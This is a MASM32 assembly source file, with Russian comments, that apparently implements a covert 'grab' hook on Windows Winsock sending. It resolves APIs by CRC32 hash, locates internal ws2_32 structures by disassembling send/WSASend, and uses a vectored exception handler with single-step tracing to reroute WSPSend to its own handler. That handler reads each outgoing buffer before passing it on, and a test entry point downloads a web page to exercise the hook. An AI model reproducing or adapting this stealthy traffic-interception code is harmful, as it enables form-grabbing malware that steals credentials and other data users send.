	.686
	.model flat, stdcall
	option casemap :none
	
	include \masm32\include\ntdll.inc
	includelib \masm32\lib\ntdll.lib

	include \masm32\include\urlmon.inc
	includelib \masm32\lib\urlmon.lib
	
	include \masm32\include\ws2_32.inc
	includelib \masm32\lib\ws2_32.lib

.code
; IDP
	include Idp.inc
; LDASM
	include VirXasm32b.asm

%GET_CURRENT_GRAPH_ENTRY macro
	Call GetGraphReference
endm

%GET_GRAPH_ENTRY macro PGET_CURRENT_GRAPH_ENTRY
	Call PGET_CURRENT_GRAPH_ENTRY
endm

%GET_GRAPH_REFERENCE macro
GetGraphReference::
	pop eax
	ret
endm

	assume fs:nothing
SEH_Prolog proc C
	pop ecx
	push ebp
	push eax
	Call SEH_GetRef
	push eax
	push dword ptr fs:[0]
	mov dword ptr fs:[0],esp
	jmp ecx
SEH_Prolog endp

SEH_Epilog proc C
	pop ecx
	pop dword ptr fs:[0]
	lea esp,[esp + 3*4]
	jmp ecx
SEH_Epilog endp

SEH_GetRef proc C
	%GET_CURRENT_GRAPH_ENTRY
	mov eax,dword ptr [esp + 4]
	mov ecx,dword ptr [esp + 3*4]	; Ctx.
	mov edx,dword ptr [esp]	; ~ nt!ExecuteHandler2().
	mov ebx,CONTEXT.regEbx[ecx]
	mov esi,CONTEXT.regEsi[ecx]
	mov edi,CONTEXT.regEdi[ecx]
	mov esp,dword ptr [esp + 2*4]	; (esp) -> ExceptionList
	mov ecx,EXCEPTION_RECORD.ExceptionAddress[eax]
	mov eax,EXCEPTION_RECORD.ExceptionCode[eax]
	mov ebp,dword ptr [esp + 3*4]
	jmp dword ptr [esp + 2*4]
SEH_GetRef endp

	%GET_GRAPH_REFERENCE

WSP_ENVIRONMENT struct
WsHandle						HANDLE ?	; ws2_32.dll
HlHandle						HANDLE ?	; ws2help.dll
pContextTable					PVOID ?
pWahReferenceContextByHandle		PVOID ?
pWahCreateHandleContextTable		PVOID ?
pGetCountedDSocketFromSocket		PVOID ?
fpGetCountedDSocketFromSocket		PVOID ?
WSP_ENVIRONMENT ends
PWSP_ENVIRONMENT typedef ptr WSP_ENVIRONMENT

; +
;
WspQueryEnvironment proc uses ebx esi edi Environment:PWSP_ENVIRONMENT
Local $Buffer[16]:CHAR, DllName:UNICODE_STRING
Local Entries[6]:PVOID, Env:WSP_ENVIRONMENT
Local pSend:PVOID
	Call SEH_Epilog_Reference
	Call SEH_Prolog
	lea ebx,$Buffer
	lea ecx,Entries
	xor edx,edx
	mov Entries[0],0F45CAC9DH	; CRC32("RtlCreateUnicodeStringFromAsciiz")
	mov Entries[4],043681CE6H	; CRC32("RtlFreeUnicodeString")
	mov Entries[2*4],0183679F2H	; CRC32("LdrLoadDll")
	mov Entries[3*4],0FED4B3C2H	; CRC32("LdrUnloadDll")
	mov Entries[4*4],0E21C1C46H	; CRC32("LdrGetDllHandle")
	mov Entries[5*4],edx
	push ecx
	push ecx
	push edx
	push edx
	mov eax,IDP_QUERY_ENTRIES
	Call IDP
	test eax,eax
	lea esi,DllName
	jnz Exit
	mov dword ptr [$Buffer],"_2SW"
	push ebx
	mov dword ptr [$Buffer + 4],"d.23"
	push esi
	mov dword ptr [$Buffer + 2*4],"ll"
	Call Entries[0]	; RtlCreateUnicodeStringFromAsciiz()
	test eax,eax
	lea ecx,Env.WsHandle
	.if Zero?
	mov eax,STATUS_INTERNAL_ERROR
	jmp Exit
	.endif
	push ecx
	push esi
	push NULL
	push NULL
	Call Entries[2*4]	; LdrLoadDll()
	push eax
	push esi
	Call Entries[4]	; RtlFreeUnicodeString()
	pop eax
	mov dword ptr [$Buffer],"dnes"
	test eax,eax
	mov dword ptr [$Buffer + 4],eax
	lea ecx,pSend
	jnz Exit
	push ecx
	push eax
	push eax
	push ebx
	push Env.WsHandle
	mov eax,IDP_QUERY_ENTRY
	Call IDP
	test eax,eax
	mov dword ptr [$Buffer],"H2SW"
	jnz Unload
	push ebx
	mov dword ptr [$Buffer + 4],".PLE"
	push esi
	mov dword ptr [$Buffer + 2*4],"lld"
	Call Entries[0]	; RtlCreateUnicodeStringFromAsciiz()
	test eax,eax
	lea ecx,Env.HlHandle
	.if Zero?
	mov eax,STATUS_INTERNAL_ERROR
	jmp Unload
	.endif
	push ecx
	push esi
	push NULL
	push NULL
	Call Entries[4*4]	; LdrGetDllHandle()
	push eax
	push esi
	Call Entries[4]	; RtlFreeUnicodeString()
	pop eax
	test eax,eax
	lea ecx,Env.pWahReferenceContextByHandle
	jnz Unload
	mov Env.pWahReferenceContextByHandle,03E2D73A7H 	; CRC32("WahReferenceContextByHandle")
	mov Env.pWahCreateHandleContextTable,0F646DDDDH 	; CRC32("WahCreateHandleContextTable")
	mov Env.pGetCountedDSocketFromSocket,eax
	push ecx
	push ecx
	push eax
	push Env.HlHandle
	mov eax,IDP_QUERY_ENTRIES
	Call IDP
	test eax,eax
	mov esi,pSend	; @send()
	jnz Unload
	lea edi,[esi + 100H]
	xor ebx,ebx
Ip:
	Call VirXasm32
	cmp al,3
	jne @f
	cmp byte ptr [esi],0C2H
	jne Step
	mov eax,STATUS_NOT_FOUND
	jmp Unload
@@:
	cmp al,5
	jne Step
	cmp byte ptr [esi],0E8H	; Call GetCountedDSocketFromSocket
	jne Step
	bts ebx,1
	jnc Step
; 2nd
	add esi,dword ptr [esi + 1]
	add esi,5	; @GetCountedDSocketFromSocket()
	lea edi,[esi + 80H]
	mov Env.pGetCountedDSocketFromSocket,esi
Ip2:
	Call VirXasm32
	cmp al,3
	jne @f
	cmp byte ptr [esi],0C2H
	jne Step2
	mov eax,STATUS_NOT_FOUND
	jmp Unload
@@:
	cmp al,6
	jne Step2
	cmp word ptr [esi],15FFH
	jne Step2
	cmp word ptr [esi - 6],35FFH	; push dword ptr [sm_context_table]
	jne Step2
	cmp word ptr [esi - 9],75FFH	; push dword ptr [ebp + 2*4]
	mov ecx,dword ptr [esi + 2]
	jne Step2
	cmp byte ptr [esi - 7],8
	mov ecx,dword ptr [ecx]
	jne Step2
	cmp Env.pWahReferenceContextByHandle,ecx
	mov edx,dword ptr [esi - 4]	; @sm_context_table
	jne Step2
	add esi,6
	mov Env.pContextTable,edx
	mov Env.fpGetCountedDSocketFromSocket,esi
	mov edi,Environment
	mov ecx,sizeof(WSP_ENVIRONMENT)/4
	lea esi,Env
	cld
	xor eax,eax
	rep movsd
	jmp Exit
Step2:
	add esi,eax
	cmp esi,edi
	jb Ip2
	jmp Unload
Step:
	add esi,eax
	cmp esi,edi
	jb Ip
Unload:
	push eax
	push Env.WsHandle
	Call Entries[3*4]
	pop eax
	jmp Exit
SEH_Epilog_Reference:
	%GET_CURRENT_GRAPH_ENTRY
Exit:
	Call SEH_Epilog
	ret
WspQueryEnvironment endp

comment '
09F9836C0H	; CRC32("WSAIoctl")
04C392168H	; CRC32("WSARecv")
0E69D34C7H	; CRC32("WSAEventSelect")
081B8C2EDH	; CRC32("WSAEnumNetworkEvents")
045CD9E77H	; CRC32("WSANtohl")
0C8C59382H	; CRC32("WSANtohs")
0854073ADH	; CRC32("WSADuplicateSocketW")
08D4E5EE3H	; CRC32("WSAGetQOSByName")
001F4CD7EH	; CRC32("WSARecvDisconnect")
0AFDB7D74H	; CRC32("WSARecvFrom")
058E09F24H	; CRC32("WSAAsyncSelect")
0F4CE50ECH	; CRC32("WSASendDisconnect")
085DA37C8H	; CRC32("WSASendTo")
030B4557AH	; CRC32("WSAConnect")
0CCA1FB58H	; CRC32("WSAAccept")
02A7B5616H	; CRC32("WSAJoinLeaf")
0C82D5F77H	; CRC32("getsockname")
0A5C6D777H	; CRC32("closesocket")
046CCF353H	; CRC32("bind")
0ED514704H	; CRC32("setsockopt")
0C3146696H	; CRC32("getsockopt")
074CFF91FH	; CRC32("connect")
059D852ADH	; CRC32("recv")
0C22467FDH	; CRC32("listen")
0597B1134H	; CRC32("getpeername")
095A2DEC2H	; CRC32("shutdown")
'
APINUMBER	equ 2

API_RANGE struct
Base		PVOID ?
Limit	PVOID ?
Index	ULONG ?	; _SockProcTable ID
Stub		PVOID ?
Frame	PVOID ?	; STACK_FRAME.rEip
API_RANGE ends
PAPI_RANGE typedef ptr API_RANGE

; +
;
WspQueryApiRange proc uses ebx esi edi Environment:PWSP_ENVIRONMENT, Validate:BOOLEAN, Api:PAPI_RANGE
Local Entries[APINUMBER + 1]:PVOID
	Call SEH_Epilog_Reference
	Call SEH_Prolog
	lea ecx,Entries
	xor edx,edx
	mov ebx,Api
	assume ebx:PAPI_RANGE
	mov esi,Environment
	mov Entries[0],0B2924908H	; CRC32("WSASend")
	mov Entries[4],0A7733ACDH	; CRC32("send")
;	..
	mov Entries[APINUMBER*4],edx
	push ecx
	push ecx
	push edx
	push WSP_ENVIRONMENT.WsHandle[esi]
	mov eax,IDP_QUERY_ENTRIES
	Call IDP
	mov ecx,WSP_ENVIRONMENT.pGetCountedDSocketFromSocket[esi]
	test eax,eax
	mov edi,APINUMBER
	jnz Exit
	mov Environment,ecx
Parse:
	xor eax,eax
	mov esi,Entries[edi*4 - 4]
	mov Api,eax
	mov [ebx].Base,esi
	mov [ebx].Index,eax
	mov [ebx].Stub,eax
	mov [ebx].Frame,eax
Ip:
	Call VirXasm32
	cmp al,3
	je @f
	cmp al,5
	jne Step
	cmp byte ptr [esi],0E8H	; call GetCountedDSocketFromSocket
	jne Step
	mov ecx,dword ptr [esi + 1]
	bt Api,0
	lea ecx,[esi + ecx + 5]
	jc Step
	cmp Environment,ecx
	lea edx,[esi + 5]
	jne Step
	bts Api,0
	mov [ebx].Frame,edx
	jmp Step
@@:
	cmp byte ptr [esi],0C2H
	je Load
	bt Api,1
	jc Step
	cmp word ptr [esi],50FFH	; call dword ptr [eax + #]
	jne Step
	movzx ecx,byte ptr [esi + 2]
	bts Api,1
	mov [ebx].Stub,esi
	shr ecx,2
	add esi,eax
	mov [ebx].Index,ecx
	jmp Ip
Load:
	cmp Validate,FALSE
	je @f
	cmp Api,11B
	je @f
	mov eax,STATUS_UNSUCCESSFUL
	jmp Exit
@@:
	add esi,3
	mov [ebx].Limit,esi
	add ebx,sizeof(API_RANGE)
	dec edi
	jnz Parse
	xor eax,eax
	jmp Exit
Step:
	add esi,eax
	jmp Ip
SEH_Epilog_Reference:
	%GET_CURRENT_GRAPH_ENTRY
Exit:
	Call SEH_Epilog
	ret
WspQueryApiRange endp

GRAB_INFORMATION struct
Env		WSP_ENVIRONMENT <>
Api		API_RANGE APINUMBER DUP (<>)
;Stub	PVOID 1 DUP (?)	; Массив обработчиков WSPxx().
GRAB_INFORMATION ends
PGRAB_INFORMATION typedef ptr GRAB_INFORMATION

; +
;
	assume fs:nothing
Initialize proc uses ebx Grab:PGRAB_INFORMATION
Local Stub[2]:PVOID
	mov ebx,Grab
	assume ebx:ptr GRAB_INFORMATION
	invoke WspQueryEnvironment, Ebx
	test eax,eax
	lea ecx,[ebx].Api
	jnz Exit
	invoke WspQueryApiRange, Ebx, TRUE, Ecx
	test eax,eax
	jnz Exit
	mov eax,IDP_INITIALIZE_ENGINE
	Call IDP
	test eax,eax
	mov ecx,[ebx].Env.pWahCreateHandleContextTable
	mov ebx,[ebx].Env.pContextTable
	jnz Exit
	.if dword ptr [Ebx] == Eax
	push ebx
	Call Ecx	; .. WSAStartup()
	test eax,eax
	jnz Exit
	.endif
	%GET_GRAPH_ENTRY $VEH
	push eax
	push 0
	mov eax,IDP_ADD_VEH
	Call IDP
	.if !Eax
	mov eax,STATUS_INTERNAL_ERROR
	.else
	push 3000H
	push ebx
	mov eax,IDP_ADD_REFERENCE
	Call IDP
	.endif
Exit:
	ret
Initialize endp

STACK_FRAME struct
rEbp		PVOID ?
rEip		PVOID ?
STACK_FRAME ends
PSTACK_FRAME typedef ptr STACK_FRAME

; +
;
	PUBLIC WspBreakFilter
WspBreakFilter proc uses ebx esi edi Grab:PGRAB_INFORMATION, Frame:PSTACK_FRAME
	Call SEH_Epilog_Reference
	Call SEH_Prolog
	mov ebx,Frame
	assume ebx:PSTACK_FRAME
	mov esi,Grab
	mov eax,[ebx].rEip
	mov edi,APINUMBER
	cmp GRAB_INFORMATION.Env.fpGetCountedDSocketFromSocket[esi],eax
	je @f
	mov eax,STATUS_NOT_FOUND
	jmp Exit
@@:
	mov ebx,[ebx].rEbp
	mov eax,[ebx].rEip
	lea esi,GRAB_INFORMATION.Api[esi]
@@:
	cmp API_RANGE.Frame[esi],eax
	je @f
	add esi,sizeof(API_RANGE)
	dec edi
	jnz @b
	mov eax,STATUS_NOT_FOUND
	jmp Exit
@@:
	xor eax,eax
	jmp Exit
SEH_Epilog_Reference:
	%GET_CURRENT_GRAPH_ENTRY
Exit:
	Call SEH_Epilog
	ret
WspBreakFilter endp

; +
; 
	PUBLIC WspIsStub
WspIsStub proc Grab:PGRAB_INFORMATION, Ip:PVOID
	mov edx,Grab
	mov eax,Ip
	lea edx,GRAB_INFORMATION.Api[edx]
	mov ecx,APINUMBER
	assume edx:PAPI_RANGE
@@:
	cmp [edx].Stub,eax
	je @f
	add edx,sizeof(API_RANGE)
	loop @b
	xor eax,eax
	jmp Exit
@@:
	mov eax,Grab
	not ecx
	mov eax,dword ptr [eax + sizeof(GRAB_INFORMATION) + 4*ecx + 4*(APINUMBER + 1)]
	mov ecx,[edx].Index
Exit:
	ret
WspIsStub endp

.data
gGrab		GRAB_INFORMATION <>
			PVOID WSPSend	; WSASend()
			PVOID WSPSend	; send()
.code
; +
; Стаб. Вызывается при возврате из GetCountedDSocketFromSocket() для начала трассировки.
;
	PUBLIC TraceSignal
$TraceSignal:
	%GET_CURRENT_GRAPH_ENTRY
TraceSignal:
	mov ecx,STACK_FRAME.rEip[ebp]
	push (EFLAGS_TF or EFLAGS_MASK)
	xchg dword ptr fs:[TbIp],ecx
	popfd
	jmp ecx

TbIp	equ (PAGE_SIZE - sizeof(THREAD_STATE) - 4)	; * Следует использовать TLS!

; +
;
	PUBLIC VEH
$VEH:
	%GET_CURRENT_GRAPH_ENTRY
VEH proc uses ebx esi edi ExceptionPointers:PEXCEPTION_POINTERS
	mov eax,ExceptionPointers
	mov esi,EXCEPTION_POINTERS.ExceptionRecord[eax]
	assume esi:PEXCEPTION_RECORD
	mov edi,EXCEPTION_POINTERS.ContextRecord[eax]
	assume edi:PCONTEXT
	cmp [esi].ExceptionFlags,NULL
	jnz Chain
	cmp [esi].ExceptionCode,IDP_BREAKPOINT
	je Load
	cmp [esi].ExceptionCode,IDP_SINGLE_STEP
	jne IsTrap
	cmp dword ptr fs:[TbIp],NULL
	mov ebx,[edi].regEbp
	jne Load
	invoke WspBreakFilter, addr gGrab, Ebx
	test eax,eax
	jnz Load
	%GET_GRAPH_ENTRY $TraceSignal
	assume ebx:PSTACK_FRAME
	mov ebx,[ebx].rEbp
	xchg [ebx].rEip,eax
	mov fs:[TbIp],eax
	jmp Load
IsTrap:
	cmp [esi].ExceptionCode,STATUS_SINGLE_STEP
	mov eax,fs:[TbIp]
	mov esi,[edi].regEip
	jne Chain
	.if Ecx == Eax
	and [edi].regEFlags,NOT(EFLAGS_TF)
	mov dword ptr fs:[TbIp],NULL
	.else
	   invoke WspIsStub, addr gGrab, Esi
	   test eax,eax
	   mov edx,[edi].regEax
	   .if !Zero?
	   mov [edi].regEip,eax
	   add esi,3
	   mov edx,dword ptr [ecx*4 + edx]
	   and [edi].regEFlags,NOT(EFLAGS_TF)
	   mov eax,[edi].regEsp
	   mov [edi].regEcx,edx
	   sub eax,4
	   mov dword ptr fs:[TbIp],NULL
	   ; * Эмулируем инструкцию call dword ptr [eax + Index*4].
	   ; * Стек будет расширен при доступе к сторожевой странице.
	   mov dword ptr [eax],esi
	   mov [edi].regEsp,eax
	   jmp Load
	   .endif
	or [edi].regEFlags,EFLAGS_TF
	.endif
Load:
	mov eax,EXCEPTION_CONTINUE_EXECUTION
Exit:
	ret
Chain:
	xor eax,eax
	jmp Exit
VEH endp
; ______________________________________________________________________

%NTERR macro
	.if Eax
	Int 3
	.endif
endm

%APIERR macro
	.if !Eax
	Int 3
	.endif
endm

comment '
INT
WSPSend(
	IN SOCKET s,
	IN LPWSABUF lpBuffers,
	IN DWORD dwBufferCount,
	OUT LPDWORD lpNumberOfBytesSent,
	IN DWORD dwFlags,
	IN LPWSAOVERLAPPED lpOverlapped,
	IN LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine,
	IN LPWSATHREADID lpThreadId,
	OUT INT FAR *lpErrno);
	'

; +	
; o Ecx: адрес оригинального обработчика(@WSPxx).
; o STACK_FRAME.rEip[ebp] - адрес возврата из оригинального обработчика.
;
	PUBLIC WSPSend
WSPSend proc uses ebx esi edi Sock:HANDLE, lpBuffers:PVOID, dwBufferCount:ULONG, lpNumberOfBytesSent:ULONG, dwFlags:DWORD, lpOverlapped:PVOID, lpCompletionRoutine:PVOID, lpThreadId:HANDLE, lpErrno:PVOID
Local Handler:PVOID
	mov Handler,ecx
	mov ebx,lpBuffers
	.if dword ptr [ebx] > 5
	invoke DbgPrint, dword ptr [ebx + 4]
	.endif
; Переход на оригинальный обработчик.
	mov ecx,Handler
	pop edi
	pop esi
	pop ebx
	leave
	jmp ecx
Exit:
; Нормальный возврат.
	ret
WSPSend endp

$File db "e:\1.html", 0
$Link db "http://www.google.ru/",0

.data
$Wsa		WSADATA <>

.code
Entry proc
	nop
	invoke Initialize, addr gGrab
	%NTERR
	invoke WSAStartup, 0202H, addr $Wsa
	invoke URLDownloadToFile, NULL, addr $Link, addr $File, 0, NULL
	%NTERR
	invoke WSACleanup
	
	int 3
	ret
Entry endp
end Entry